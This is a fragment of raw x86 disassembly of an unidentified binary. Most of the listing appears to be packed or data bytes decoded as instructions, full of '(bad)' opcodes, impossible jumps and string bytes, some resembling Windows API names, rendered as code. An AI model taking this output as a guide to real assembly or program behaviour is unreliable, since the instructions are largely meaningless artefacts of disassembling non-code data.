  41f9fe:	xor    al,0x35
  41fa00:	pop    ss
  41fa01:	push   edx
  41fa02:	(bad)  
  41fa03:	iret   
  41fa04:	xlat   BYTE PTR ds:[ebx]
  41fa06:	push   cs
  41fa07:	rcl    DWORD PTR [ebx-0x5b],1
  41fa0a:	pop    eax
  41fa0b:	mov    BYTE PTR [ebp+0x41cd9014],0xa7
  41fa12:	or     bl,dl
  41fa14:	fisubr WORD PTR [esi-0x5f]
  41fa17:	jp     0x41fa6c
  41fa19:	mov    WORD PTR [edx+ecx*2+0x7f015749],fs
  41fa20:	mov    WORD PTR [eax],?
  41fa22:	mov    bh,0x48
  41fa24:	ds aam 0xd7
  41fa27:	pop    esi
  41fa28:	fisubr WORD PTR [ebp-0x5ceffd1c]
  41fa2e:	cmp    DWORD PTR [edx-0x428549f9],ebx
  41fa34:	stos   DWORD PTR es:[edi],eax
  41fa35:	std    
  41fa36:	push   0x155e240c
  41fa3b:	jbe    0x41fa38
  41fa3d:	aas    
  41fa3e:	test   al,0x35
  41fa40:	pop    edi
  41fa41:	push   0x50094b03
  41fa46:	jo     0x41fa6b
  41fa48:	mov    cl,0x3b
  41fa4a:	inc    esi
  41fa4b:	mov    WORD PTR [ebp-0x39],es
  41fa4e:	mov    ds:0x77292ec4,al
  41fa53:	ja     0x41fa4e
  41fa55:	ja     0x41fa0c
  41fa57:	(bad)  
  41fa58:	shl    esp,cl
  41fa5a:	cld    
  41fa5b:	jmp    0x41fa95
  41fa5d:	mov    eax,0xe8f8a681
  41fa62:	adc    ecx,ebp
  41fa64:	cmp    edi,ebp
  41fa66:	es ret 
  41fa68:	lds    esi,FWORD PTR [edx+eax*2-0x57c1ec8f]
  41fa6f:	ins    BYTE PTR es:[edi],dx
  41fa70:	mov    esp,0x825aed97
  41fa75:	aam    0x57
  41fa77:	mov    al,0x9b
  41fa79:	jo     0x41fa00
  41fa7b:	xor    BYTE PTR [ebx],al
  41fa7d:	dec    ebx
  41fa7e:	push   ss
	...
  41fa8b:	(bad)  
  41fa8d:	test   eax,0xddffeef7
  41fa93:	and    al,0x1
  41fa95:	pop    ebp
  41fa96:	dec    edi
  41fa97:	push   edi
  41fa98:	enter  0xb717,0x47
  41fa9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa9d:	add    DWORD PTR [eax],eax
  41fa9f:	lods   al,BYTE PTR ds:[esi]
  41faa0:	add    BYTE PTR [eax],al
  41faa2:	add    BYTE PTR [edi-0xc6d32b],dl
  41faa8:	in     al,0xbb
  41faaa:	cs mov bl,0x7d
  41faad:	fst    QWORD PTR [edi-0x66]
  41fab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fab1:	icebp  
  41fab2:	int    0x59
  41fab4:	fadd   QWORD PTR [edx+esi*2-0x52]
  41fab8:	adc    edi,DWORD PTR [eax+eax*4+0x3f]
  41fabc:	push   0xf4f3759c
  41fac1:	aaa    
  41fac2:	mov    al,0x48
  41fac4:	cdq    
  41fac5:	push   edx
  41fac6:	js     0x41fae8
  41fac8:	in     eax,dx
  41fac9:	pop    ss
  41faca:	iret   
  41facb:	in     eax,0x0
  41facd:	or     bh,BYTE PTR [ecx+0x74]
  41fad0:	inc    edi
  41fad1:	ins    BYTE PTR es:[edi],dx
  41fad2:	or     eax,0xf8d9c855
  41fad7:	jle    0x41fade
  41fad9:	jne    0x41fb47
  41fadb:	xchg   esp,eax
  41fadc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fadd:	and    al,0xf4
  41fadf:	test   BYTE PTR [edi],bl
  41fae1:	xchg   edx,eax
  41fae2:	dec    ebp
  41fae3:	ret    
  41fae4:	jns    0x41fadc
  41fae6:	das    
  41fae7:	inc    eax
  41fae8:	mov    ebp,0x3e6aa810
  41faed:	test   al,0xfb
  41faef:	xchg   ebp,eax
  41faf0:	ret    
  41faf1:	fdiv   DWORD PTR ds:0x73f06fdd
  41faf7:	jno    0x41fb25
  41faf9:	test   ch,bl
  41fafb:	jo     0x41fa8c
  41fafd:	inc    esp
  41fafe:	cld    
  41faff:	xchg   edi,eax
  41fb00:	mov    ebx,0x5bb855c
  41fb05:	push   eax
  41fb06:	loope  0x41fa9e
  41fb08:	sbb    eax,0x8d33e1b6
  41fb0d:	fsub   DWORD PTR [ecx+0x7c]
  41fb10:	xchg   ebp,eax
  41fb11:	dec    edi
  41fb12:	mov    esi,0xcae7e321
  41fb17:	adc    al,0x3f
  41fb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb1a:	cmpxchg BYTE PTR [ebp+0x13],dh
  41fb1e:	lock sub ebx,esp
  41fb21:	loope  0x41faea
  41fb23:	mov    ebp,0x75deb67f
  41fb28:	push   edi
  41fb29:	jmp    0x40909037
  41fb2e:	mov    esi,0x6b71a86a
  41fb33:	jb     0x41fba0
  41fb35:	bound  esi,QWORD PTR [ebp+edx*4-0x2db592cf]
  41fb3c:	xchg   esi,eax
  41fb3d:	dec    eax
  41fb3e:	mov    ecx,?
  41fb40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb41:	push   cs
  41fb42:	mov    ds:0x70b09139,al
  41fb47:	mov    esi,0x6d6026b8
  41fb4c:	mov    ecx,0xc0
	...
  41fb59:	add    BYTE PTR [eax],al
  41fb5b:	outs   dx,DWORD PTR ds:[esi]
  41fb5c:	mov    ds:0x7edd2ad4,al
  41fb61:	jmp    edi
  41fb63:	push   edx
  41fb64:	fcmovu st,st(5)
  41fb66:	in     eax,0x38
  41fb68:	mov    bl,0xb5
  41fb6a:	pop    edx
  41fb6b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb6d:	add    DWORD PTR [eax],eax
  41fb6f:	lods   al,BYTE PTR ds:[esi]
  41fb70:	add    BYTE PTR [eax],al
  41fb72:	add    bl,bh
  41fb74:	popf   
  41fb75:	fcom   QWORD PTR [edx+0x55a0bbb0]
  41fb7b:	mov    bl,0x4f
  41fb7d:	push   ebp
  41fb7e:	test   al,0x3
  41fb80:	adc    DWORD PTR [eax+0x17e03152],eax
  41fb86:	(bad)  
  41fb88:	xlat   BYTE PTR ds:[ebx]
  41fb89:	pushf  
  41fb8a:	call   0xc0b7:0x9df2db4a
  41fb91:	aas    
  41fb92:	adc    ebx,ebp
  41fb94:	out    dx,eax
  41fb95:	ins    BYTE PTR es:[edi],dx
  41fb96:	shr    BYTE PTR [edx-0x52],cl
  41fb99:	xor    DWORD PTR [esp+edi*4],ebp
  41fb9c:	push   es
  41fb9d:	and    BYTE PTR [edi+0x62ad1dcb],0xc7
  41fba4:	dec    esi
  41fba5:	test   al,0xb8
  41fba7:	jne    0x41fbcf
  41fba9:	pop    ecx
  41fbaa:	xchg   ecx,eax
  41fbab:	add    ah,BYTE PTR cs:[esi]
  41fbae:	cmp    esi,DWORD PTR [edx]
  41fbb0:	push   esi
  41fbb1:	and    BYTE PTR [edx+0x1007e7a6],cl
  41fbb7:	aas    
  41fbb8:	ja     0x41fb72
  41fbba:	mov    bl,0x21
  41fbbc:	call   0xe203:0x5539df1d
  41fbc3:	inc    ebx
  41fbc4:	sbb    esi,DWORD PTR [esi]
  41fbc6:	mov    edx,0x408cffde
  41fbcb:	sbb    al,0xa7
  41fbcd:	arpl   WORD PTR [ecx+0x2873afce],sp
  41fbd3:	mov    ah,0xa2
  41fbd5:	mov    ah,0x7b
  41fbd7:	test   DWORD PTR [eax],ebx
  41fbd9:	and    BYTE PTR ds:0xd6cc3a9d,dl
  41fbdf:	(bad)  
  41fbe0:	stos   DWORD PTR es:[edi],eax
  41fbe1:	jg     0x41fc3f
  41fbe3:	adc    ebx,eax
  41fbe5:	mov    al,ds:0x896e16f1
  41fbea:	mov    bh,0x90
  41fbec:	add    bh,BYTE PTR [ebx]
  41fbee:	adc    esp,DWORD PTR [ecx+0x18bcccc0]
  41fbf4:	add    DWORD PTR [edx+edx*2-0x93a9d0e],ecx
  41fbfb:	pop    eax
  41fbfc:	aad    0x3c
  41fbfe:	xchg   BYTE PTR [ebp-0x42b5c7f6],cl
  41fc04:	xchg   esp,eax
  41fc05:	adc    ch,BYTE PTR [edx-0x5f]
  41fc08:	xchg   esi,eax
  41fc09:	xchg   esp,eax
  41fc0a:	push   esi
  41fc0b:	jns    0x41fb8d
  41fc0d:	(bad)  
  41fc0e:	jno    0x41fc77
  41fc10:	divps  xmm1,XMMWORD PTR [edi]
  41fc13:	xchg   esi,eax
  41fc14:	jnp    0x41fc1d
  41fc16:	jecxz  0x41fc51
  41fc18:	in     eax,0x8b
  41fc1a:	pop    ebp
  41fc1b:	cmp    dh,BYTE PTR [edx]
  41fc1d:	xchg   esp,eax
  41fc1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  41fc2b:	stc    
  41fc2c:	sbb    al,al
  41fc2e:	inc    esi
  41fc2f:	jecxz  0x41fc0f
  41fc31:	(bad)  
  41fc32:	mov    edi,0xe1f1bc83
  41fc37:	push   esp
  41fc38:	adc    esp,esi
  41fc3a:	ficomp DWORD PTR [edi-0x53fffe58]
  41fc40:	add    BYTE PTR [eax],al
  41fc42:	add    BYTE PTR [ebx+0x6788f6a2],ah
  41fc48:	aas    
  41fc49:	jbe    0x41fc27
  41fc4b:	and    al,0x5f
  41fc4d:	lods   al,BYTE PTR ds:[esi]
  41fc4e:	ins    DWORD PTR es:[edi],dx
  41fc4f:	mov    cl,0xfb
  41fc51:	xor    bl,ah
  41fc53:	xchg   edx,eax
  41fc54:	add    DWORD PTR [esi+0x4003c686],edi
  41fc5a:	sahf   
  41fc5b:	popa   
  41fc5c:	repnz pop es
  41fc5e:	dec    bh
  41fc60:	mov    esp,0x1ad0347c
  41fc65:	or     BYTE PTR [edi+0x16b19140],ch
  41fc6b:	sbb    edi,ebx
  41fc6d:	mov    bh,0xc7
  41fc6f:	ds icebp 
  41fc71:	adc    ecx,esi
  41fc73:	jmp    0x41fc99
  41fc75:	pushf  
  41fc76:	xchg   ebx,eax
  41fc77:	adc    BYTE PTR [eax*2+0xa717942],ch
  41fc7e:	mov    al,ds:0xbc513642
  41fc83:	and    ebp,esp
  41fc85:	retf   
  41fc86:	add    esp,0x4952e30b
  41fc8c:	xchg   DWORD PTR cs:[edx],esp
  41fc8f:	jge    0x41fc7f
  41fc91:	(bad)  
  41fc93:	icebp  
  41fc94:	test   al,0xea
  41fc96:	mov    dh,0x34
  41fc98:	lahf   
  41fc99:	mov    eax,0x56fb2370
  41fc9e:	xor    ebp,eax
  41fca0:	inc    eax
  41fca1:	jecxz  0x41fce5
  41fca3:	sahf   
  41fca4:	ins    DWORD PTR es:[edi],dx
  41fca5:	inc    esp
  41fca6:	jne    0x41fcd2
  41fca8:	mov    WORD PTR [edx],es
  41fcaa:	pop    edi
  41fcab:	imul   edi,DWORD PTR [ebx-0x78],0x472bb2c2
  41fcb2:	loope  0x41fc7f
  41fcb4:	and    cl,BYTE PTR [ecx-0x37f3ecf1]
  41fcba:	cli    
  41fcbb:	jmp    0x3de846e9
  41fcc0:	sbb    dh,BYTE PTR [ecx+edx*2-0x50]
  41fcc4:	and    DWORD PTR [edi+esi*8],edx
  41fcc7:	repz xor ch,al
  41fcca:	mov    cl,0xce
  41fccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fccd:	and    BYTE PTR [esi-0xba9d766],ch
  41fcd3:	ficomp DWORD PTR [esi+0x33]
  41fcd6:	jp     0x41fcfc
  41fcd8:	in     eax,0x6
  41fcda:	aaa    
  41fcdb:	sub    al,0x5b
  41fcdd:	jno    0x41fc7c
  41fcdf:	mov    WORD PTR [ecx+0x4d416fd5],?
  41fce5:	jg     0x41fcbd
  41fce7:	lods   al,BYTE PTR ds:[esi]
  41fce8:	jae    0x41fcda
  41fcea:	pusha  
  41fceb:	cmc    
  41fcec:	adc    al,0xfb
  41fcee:	fiadd  DWORD PTR [eax]
	...
  41fcf8:	add    BYTE PTR [eax],al
  41fcfa:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fd00:	(bad)  
  41fd01:	mov    ch,0xbb
  41fd03:	icebp  
  41fd04:	and    eax,0x8d098c27
  41fd09:	clc    
  41fd0a:	pusha  
  41fd0b:	dec    ebx
  41fd0c:	test   eax,0xac0001
  41fd11:	add    BYTE PTR [eax],al
  41fd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd14:	pop    ecx
  41fd15:	ficomp DWORD PTR [eax+0x2c4a3ec1]
  41fd1b:	dec    edi
  41fd1c:	dec    edx
  41fd1d:	mov    ebp,0x4bc1d666
  41fd22:	fisttp WORD PTR [esi-0x60cebbf2]
  41fd28:	add    ebx,DWORD PTR [eax+0x11]
  41fd2b:	mov    BYTE PTR [ecx],al
  41fd2d:	out    0x2,eax
  41fd2f:	adc    eax,0x9a02b81c
  41fd34:	push   ecx
  41fd35:	add    al,BYTE PTR [esi-0x5eacffe]
  41fd3b:	enter  0x6a1a,0x23
  41fd3f:	test   eax,0x4292b560
  41fd44:	lds    ebx,FWORD PTR [ebx]
  41fd46:	mov    dl,0x4e
  41fd48:	xchg   esp,eax
  41fd49:	add    al,0x4f
  41fd4b:	inc    ecx
  41fd4c:	std    
  41fd4d:	out    0xb7,eax
  41fd4f:	sub    dh,dh
  41fd51:	mov    DWORD PTR [edi+0x12577cce],edx
  41fd57:	scas   eax,DWORD PTR es:[edi]
  41fd58:	cmp    edi,DWORD PTR [ebx-0x3b]
  41fd5b:	(bad)  
  41fd5c:	xchg   edi,eax
  41fd5d:	dec    edx
  41fd5e:	scas   eax,DWORD PTR es:[edi]
  41fd5f:	xlat   BYTE PTR ds:[ebx]
  41fd60:	cmp    ah,dl
  41fd62:	sub    dl,cl
  41fd64:	mul    BYTE PTR [ebp-0x23]
  41fd67:	das    
  41fd68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd69:	ja     0x41fdae
  41fd6b:	xchg   ecx,eax
  41fd6c:	cmp    BYTE PTR [edx-0x53],dh
  41fd6f:	xor    ebp,DWORD PTR [esi+0x65]
  41fd72:	fild   WORD PTR [eax+esi*1-0x26]
  41fd76:	inc    ebp
  41fd77:	xchg   DWORD PTR [edx+edi*1-0x4],eax
  41fd7b:	in     al,dx
  41fd7c:	push   eax
  41fd7d:	loop   0x41fd1a
  41fd7f:	mov    dl,0xa9
  41fd81:	mov    ebp,0x56a5a126
  41fd86:	push   0xffffff96
  41fd88:	je     0x41fd86
  41fd8a:	push   cs
  41fd8b:	out    dx,eax
  41fd8c:	inc    ebx
  41fd8d:	fimul  DWORD PTR [esi]
  41fd8f:	add    ebp,DWORD PTR [ebx+0x312a7f2a]
  41fd95:	jo     0x41fd9a
  41fd97:	popf   
  41fd98:	fist   DWORD PTR [edi]
  41fd9a:	or     eax,0x62b700aa
  41fd9f:	mov    bh,0xde
  41fda1:	jbe    0x41fd44
  41fda3:	sub    cl,cl
  41fda5:	pop    esp
  41fda6:	repz test ch,ah
  41fda9:	cdq    
  41fdaa:	int    0x27
  41fdac:	pusha  
  41fdad:	xchg   esp,eax
  41fdae:	fadd   QWORD PTR [eax+0x14aa0b06]
  41fdb4:	es scas al,BYTE PTR es:[edi]
  41fdb6:	pop    edi
  41fdb7:	repnz popf 
  41fdb9:	stc    
  41fdba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdbb:	dec    ebp
  41fdbc:	jle    0x41fd63
  41fdbe:	xor    eax,0x0
	...
  41fdcb:	adc    dl,bh
  41fdcd:	repz or esi,edi
  41fdd0:	das    
  41fdd1:	cli    
  41fdd2:	fist   WORD PTR [ecx]
  41fdd4:	dec    ebx
  41fdd5:	es nop
  41fdd7:	mov    ebx,0xf7875f80
  41fddc:	test   eax,0xac0001
  41fde1:	add    BYTE PTR [eax],al
  41fde3:	fistp  DWORD PTR [esi-0x57]
  41fde6:	repnz iret 
  41fde8:	out    0xfd,al
  41fdea:	jl     0x41fe60
  41fdec:	mov    ds:0x34adccec,eax
  41fdf1:	adc    eax,esp
  41fdf3:	popa   
  41fdf4:	sti    
  41fdf5:	(bad)  
  41fdf6:	stos   DWORD PTR es:[edi],eax
  41fdf7:	cld    
  41fdf8:	cmp    eax,0x9c5603a9
  41fdfd:	dec    esi
  41fdfe:	ins    BYTE PTR es:[edi],dx
  41fdff:	pop    DWORD PTR [edi-0x1]
  41fe02:	in     al,0xdf
  41fe04:	jbe    0x41fe81
  41fe06:	jecxz  0x41fe64
  41fe08:	test   DWORD PTR [edx+0x3e],ebp
  41fe0b:	mov    cl,0x69
  41fe0d:	pusha  
  41fe0e:	sbb    dh,ah
  41fe10:	cmp    BYTE PTR [ebp+0x68235700],cl
  41fe16:	sbb    DWORD PTR [eax-0x36190291],0xb811aa12
  41fe20:	pop    es
  41fe21:	leave  
  41fe22:	out    dx,al
  41fe23:	adc    al,0xe9
  41fe25:	push   ecx
  41fe26:	in     eax,dx
  41fe27:	les    ebx,FWORD PTR [esi-0x70]
  41fe2a:	scas   al,BYTE PTR es:[edi]
  41fe2b:	xchg   ebx,eax
  41fe2c:	hlt    
  41fe2d:	and    dh,ah
  41fe2f:	pop    es
  41fe30:	cwde   
  41fe31:	add    eax,ebp
  41fe33:	pop    ss
  41fe34:	neg    DWORD PTR [edx]
  41fe36:	cmp    esp,DWORD PTR [ebx]
  41fe38:	sub    eax,0xd79d3ed6
  41fe3d:	xor    bl,BYTE PTR [edi-0x24]
  41fe40:	fstp   DWORD PTR [edi+0x7e]
  41fe43:	bsr    ecx,DWORD PTR [eax+0x72]
  41fe47:	cmp    DWORD PTR [ecx],eax
  41fe49:	mov    eax,ds:0x5de47604
  41fe4e:	nop
  41fe4f:	cmp    al,0x3d
  41fe51:	and    eax,0xe662c8df
  41fe56:	jecxz  0x41fde9
  41fe58:	mov    edx,0xfa6d8388
  41fe5d:	or     dl,BYTE PTR [ecx-0x53bcf419]
  41fe63:	sub    BYTE PTR [edx],dh
  41fe65:	sub    esp,DWORD PTR [ebx]
  41fe67:	dec    esp
  41fe68:	jmp    0x893b:0x4e69524
  41fe6f:	mov    cl,0x56
  41fe71:	jo     0x41fe62
  41fe73:	cli    
  41fe74:	(bad)  
  41fe76:	pop    eax
  41fe77:	or     eax,0x42b16b39
  41fe7c:	sub    al,0xa6
  41fe7e:	adc    esp,ecx
  41fe80:	std    
  41fe81:	mov    ds:0xe97a844d,eax
  41fe86:	adc    eax,0xd93e4876
  41fe8b:	test   eax,0x53d1be
	...
  41fe9c:	nop
  41fe9d:	inc    edx
  41fe9e:	add    BYTE PTR [eax+edx*4],al
  41fea1:	inc    edx
  41fea2:	add    BYTE PTR [eax],cl
  41fea4:	nop
  41fea5:	inc    edx
  41fea6:	add    BYTE PTR [eax+edx*4],cl
  41fea9:	inc    edx
  41feaa:	add    BYTE PTR [eax],dl
  41feac:	nop
  41fead:	inc    edx
  41feae:	add    BYTE PTR [eax+edx*4],dl
  41feb1:	inc    edx
  41feb2:	add    BYTE PTR [eax],bl
  41feb4:	nop
  41feb5:	inc    edx
  41feb6:	add    BYTE PTR [eax+edx*4],bl
  41feb9:	inc    edx
  41feba:	add    BYTE PTR [esi+0x49],cl
  41febd:	dec    esi
  41febe:	pop    edi
  41febf:	pop    edx
  41fec0:	dec    edx
  41fec1:	inc    ecx
  41fec2:	xor    eax,DWORD PTR [eax]
  41fec4:	push   ebx
  41fec5:	push   edi
  41fec6:	inc    edi
  41fec7:	cmp    DWORD PTR [edi+0x41],ebx
  41feca:	pop    eax
  41fecb:	ss push esi
  41fecd:	pop    ecx
  41fece:	add    BYTE PTR [ebx+0x43],dl
  41fed1:	inc    ebp
  41fed2:	pop    edi
  41fed3:	inc    ecx
  41fed4:	pop    eax
  41fed5:	push   edi
  41fed6:	dec    eax
  41fed7:	inc    edx
  41fed8:	pop    edi
  41fed9:	cmp    DWORD PTR [ecx+0x4d],ecx
  41fedc:	dec    ecx
  41fedd:	add    BYTE PTR [ecx+0x46],al
  41fee0:	cmp    DWORD PTR [edx],esi
  41fee2:	xor    ebx,DWORD PTR [edi+0x32]
  41fee5:	aaa    
  41fee6:	inc    esp
  41fee7:	inc    esp
  41fee8:	pop    edi
  41fee9:	xor    eax,0x41545800
  41feee:	pop    edi
  41feef:	push   ecx
  41fef0:	push   esp
  41fef1:	inc    esi
  41fef2:	push   ebp
  41fef3:	cmp    DWORD PTR [eax],eax
  41fef5:	push   edi
  41fef6:	push   ebp
  41fef7:	inc    ecx
  41fef8:	xor    dh,BYTE PTR [ebx]
  41fefa:	xor    ebx,DWORD PTR [edi+0x4e]
  41fefd:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff01:	cmp    DWORD PTR [edi+0x38],ebx
  41ff04:	dec    ecx
  41ff05:	cmp    DWORD PTR [edx+0x36],ebx
  41ff08:	pop    edi
  41ff09:	dec    edx
  41ff0a:	xor    BYTE PTR [edx+0x34],cl
  41ff0d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff11:	xor    esi,DWORD PTR [eax]
  41ff13:	pop    edi
  41ff14:	inc    edx
  41ff15:	dec    ebx
  41ff16:	pop    eax
  41ff17:	pop    eax
  41ff18:	xor    eax,0x51414d00
  41ff1d:	pop    edi
  41ff1e:	inc    ecx
  41ff1f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff22:	inc    ecx
  41ff23:	dec    ebx
  41ff24:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff2a:	inc    ebp
  41ff2b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff2e:	ss dec eax
  41ff30:	dec    ebx
  41ff31:	add    BYTE PTR [ebp+0x57],al
  41ff34:	xor    DWORD PTR [edi+0x31],ebx
  41ff37:	dec    ebx
  41ff38:	xor    eax,DWORD PTR [ecx+0x30]
  41ff3b:	push   ebx
  41ff3c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff40:	aaa    
  41ff41:	pop    edi
  41ff42:	push   edx
  41ff43:	dec    eax
  41ff44:	dec    ebp
  41ff45:	cmp    BYTE PTR [edi+0x37],bl
  41ff48:	inc    esi
  41ff49:	xor    eax,0x35005500
  41ff4e:	add    BYTE PTR [ebx+0x0],al
  41ff51:	pop    edi
  41ff52:	add    BYTE PTR [ecx+0x0],bl
  41ff55:	dec    ecx
  41ff56:	add    BYTE PTR [ebx+0x0],dl
  41ff59:	xor    al,BYTE PTR [eax]
  41ff5b:	pop    edi
  41ff5c:	add    BYTE PTR [edx+0x0],dl
  41ff5f:	add    BYTE PTR [eax],al
  41ff61:	push   eax
  41ff62:	add    BYTE PTR [ebp+0x0],dl
  41ff65:	dec    ecx
  41ff66:	add    BYTE PTR [eax],dh
  41ff68:	add    BYTE PTR [edi+0x0],bl
  41ff6b:	inc    ebx
  41ff6c:	add    BYTE PTR [esi],dh
  41ff6e:	add    BYTE PTR [ebp+0x0],al
  41ff71:	xor    al,BYTE PTR [eax]
  41ff73:	pop    edi
  41ff74:	add    BYTE PTR [ebp+0x0],cl
  41ff77:	xor    al,0x0
  41ff79:	dec    edx
  41ff7a:	add    BYTE PTR [edx+0x0],dl
  41ff7d:	push   ebp
  41ff7e:	add    BYTE PTR [eax],al
  41ff80:	add    BYTE PTR [esi+0x0],cl
  41ff83:	cmp    DWORD PTR [eax],eax
  41ff85:	push   eax
  41ff86:	add    BYTE PTR [edi+0x0],bl
  41ff89:	push   ebp
  41ff8a:	add    BYTE PTR [ecx],bh
  41ff8c:	add    BYTE PTR [esi],dh
  41ff8e:	add    BYTE PTR [eax],dh
  41ff90:	add    BYTE PTR [ecx],dh
  41ff92:	add    BYTE PTR [edi+0x0],bl
  41ff95:	dec    edi
  41ff96:	add    BYTE PTR [esi+0x0],cl
  41ff99:	push   esp
  41ff9a:	add    BYTE PTR [eax],bh
  41ff9c:	add    BYTE PTR [eax],al
  41ff9e:	add    BYTE PTR [eax+eax*1+0x34],cl
  41ffa2:	add    BYTE PTR [eax+eax*1+0x31],al
  41ffa6:	add    BYTE PTR [edi+0x0],bl
  41ffa9:	dec    ebx
  41ffaa:	add    BYTE PTR [ecx],dh
  41ffac:	add    BYTE PTR [ebp+0x0],al
  41ffaf:	pop    edi
  41ffb0:	add    BYTE PTR [edx+0x0],bl
  41ffb3:	add    BYTE PTR [eax],al
  41ffb5:	push   esp
  41ffb6:	add    BYTE PTR [edi],dh
  41ffb8:	add    BYTE PTR [ebx+0x0],al
  41ffbb:	pop    edi
  41ffbc:	add    BYTE PTR [edx+0x0],al
  41ffbf:	xor    al,BYTE PTR [eax]
  41ffc1:	xor    DWORD PTR [eax],eax
  41ffc3:	push   ebx
  41ffc4:	add    BYTE PTR [ecx],dh
  41ffc6:	add    BYTE PTR [ecx],bh
  41ffc8:	add    BYTE PTR [edx+0x0],al
  41ffcb:	add    BYTE PTR [eax],al
  41ffcd:	inc    edi
  41ffce:	add    BYTE PTR [ebp+0x0],al
  41ffd1:	xor    al,0x0
  41ffd3:	cmp    BYTE PTR [eax],al
  41ffd5:	add    BYTE PTR [eax],al
  41ffd7:	add    BYTE PTR [eax+0x42],dl
  41ffda:	add    BYTE PTR [eax+edx*2],al
  41ffdd:	inc    edx
  41ffde:	add    BYTE PTR [eax],cl
  41ffe0:	push   eax
  41ffe1:	inc    edx
  41ffe2:	add    BYTE PTR [eax+edx*2],cl
  41ffe5:	inc    edx
  41ffe6:	add    BYTE PTR [eax],dl
  41ffe8:	push   eax
  41ffe9:	inc    edx
  41ffea:	add    BYTE PTR [eax+edx*2],dl
  41ffed:	inc    edx
  41ffee:	add    BYTE PTR [eax],bl
  41fff0:	push   eax
  41fff1:	inc    edx
  41fff2:	add    BYTE PTR [eax+edx*2],bl
  41fff5:	inc    edx
  41fff6:	add    BYTE PTR [eax],ah
  41fff8:	push   eax
  41fff9:	inc    edx
  41fffa:	add    BYTE PTR [eax+edx*2],ah
  41fffd:	inc    edx
  41fffe:	add    BYTE PTR [eax],ch
  420000:	push   eax
  420001:	inc    edx
	...
  420012:	add    BYTE PTR [eax],al
  420014:	call   0x0:0x4d3ef2
  42001b:	add    BYTE PTR [edx+0x0],al
  42001e:	add    al,BYTE PTR [eax]
  420020:	add    DWORD PTR [eax],eax
  420022:	add    BYTE PTR [eax],al
  420024:	add    DWORD PTR [eax],eax
  420026:	add    BYTE PTR [eax],al
  420028:	add    DWORD PTR [eax],eax
  42002a:	add    BYTE PTR [eax],al
  42002c:	cmp    BYTE PTR [eax],al
  42002e:	add    al,BYTE PTR [eax]
  420030:	cmp    al,0x0
  420032:	add    al,BYTE PTR [eax]
  420034:	inc    eax
  420035:	add    BYTE PTR [edx],al
  420037:	add    ah,bl
  420039:	cmp    al,0x0
  42003b:	add    BYTE PTR [esi+0x0],cl
  42003e:	add    al,BYTE PTR [eax]
  420040:	add    BYTE PTR [eax],al
  420042:	push   edi
  420043:	outs   dx,DWORD PTR ds:[esi]
  420044:	jb     0x4200aa
  420046:	push   edi
  420047:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42004e:	aas    
  42004f:	inc    ebx
  420050:	ins    BYTE PTR es:[edi],dx
  420051:	outs   dx,DWORD PTR ds:[esi]
  420052:	jae    0x4200b9
  420054:	push   edi
  420055:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42005c:	popa   
  42005d:	je     0x4200c8
  42005f:	outs   dx,DWORD PTR ds:[esi]
  420060:	outs   dx,BYTE PTR ds:[esi]
  420061:	inc    ebx
  420062:	ins    BYTE PTR es:[edi],dx
  420063:	outs   dx,DWORD PTR ds:[esi]
  420064:	jae    0x4200cb
  420066:	push   edi
  420067:	imul   eax,DWORD PTR [eax],0x0
	...
